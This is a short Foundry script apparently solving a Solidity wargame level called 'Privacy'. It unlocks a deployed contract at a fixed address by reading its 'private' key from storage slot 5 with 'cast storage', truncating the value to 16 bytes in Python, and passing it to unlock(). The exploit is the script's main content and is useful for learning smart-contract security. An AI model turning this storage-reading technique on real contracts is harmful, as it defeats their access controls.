// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "../src/Privacy.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract PrivacySolution is Script {

    address target = 0xCC93c7377c86939384cD99D5A93e3C9Bc4548298;
    Privacy privacy = Privacy(target);
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        privacy.unlock(0x61fbc9d658ffc07d52c74b8b2ee73466);
        console.log("Locked : ", privacy.locked());
        
        vm.stopBroadcast();
    }
}

// cast storage 0xCC93c7377c86939384cD99D5A93e3C9Bc4548298 5
// 0x61fbc9d658ffc07d52c74b8b2ee734663d8254941569788583e82cc6bbd0e20f

// python -c 'data="61fbc9d658ffc07d52c74b8b2ee734663d8254941569788583e82cc6bbd0e20f"; print(data[:32])'
// 61fbc9d658ffc07d52c74b8b2ee73466